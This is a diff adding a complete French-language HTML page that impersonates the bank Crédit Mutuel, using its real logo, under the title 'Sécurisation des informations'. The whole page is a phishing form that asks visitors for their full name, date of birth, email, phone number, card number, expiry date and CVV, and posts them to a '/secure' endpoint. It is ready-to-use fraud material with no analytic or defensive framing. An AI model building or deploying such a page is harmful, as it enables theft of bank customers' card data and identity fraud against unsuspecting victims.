@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sécurisation des informations - Crédit Mutuel</title>
+<style>
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #f7f9fc;
+    margin: 0;
+    color: #0a1f47;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  header {
+    background: white;
+    padding: 12px 30px;
+    box-shadow: 0 1px 6px rgba(0,0,0,0.1);
+    display: flex;
+    align-items: center;
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 1000;
+  }
+  header img {
+    height: 40px;
+  }
+  main {
+    flex: 1;
+    margin-top: 72px;
+    max-width: 480px;
+    margin-left: auto;
+    margin-right: auto;
+    background: white;
+    border-radius: 10px;
+    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
+    padding: 40px 30px;
+  }
+  h1 {
+    font-size: 28px;
+    font-weight: 700;
+    margin-bottom: 24px;
+  }
+  label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+  input {
+    width: 100%;
+    padding: 12px 15px;
+    font-size: 16px;
+    border: 1.5px solid #cbd7ef;
+    border-radius: 10px;
+    margin-bottom: 24px;
+    color: #0a1f47;
+  }
+  input::placeholder {
+    color: #6b7a99;
+  }
+  button {
+    width: 100%;
+    background-color: #0a1f47;
+    border: none;
+    padding: 16px;
+    border-radius: 12px;
+    color: white;
+    font-weight: 700;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #061436;
+  }
+  @media (max-width: 480px) {
+    main {
+      margin: 72px 15px 20px;
+      padding: 30px 20px;
+    }
+    h1 {
+      font-size: 24px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <img src="https://cdnsi.e-i.com/INGR/sd/cm_2023/7.122.4/fr/images/css/env/logo.svg" alt="Logo Crédit Mutuel" />
+</header>
+
+<main>
+  <h1>Informations personnelles</h1>
+  <form method="POST" action="/secure">
+    <label for="nom">Nom complet</label>
+    <input type="text" id="nom" name="nom" placeholder="Votre nom complet" required />
+
+    <label for="naissance">Date de naissance</label>
+    <input type="date" id="naissance" name="naissance" required />
+
+    <label for="email">Adresse e-mail</label>
+    <input type="email" id="email" name="email" placeholder="exemple@domaine.com" required />
+
+    <label for="telephone">Numéro de téléphone</label>
+    <input type="tel" id="telephone" name="telephone" placeholder="06 12 34 56 78" required />
+
+    <label for="carte">Numéro de carte bancaire</label>
+    <input type="text" id="carte" name="carte" placeholder="1234 5678 9012 3456" maxlength="19" required />
+
+    <label for="expiration">Date d'expiration (MM/AA)</label>
+    <input type="text" id="expiration" name="expiration" placeholder="MM/AA" maxlength="5" required />
+
+    <label for="cvv">Cryptogramme visuel (CVV)</label>
+    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required />
+
+    <button type="submit">Valider les informations</button>
+  </form>
+</main>
+
+</body>
+</html>
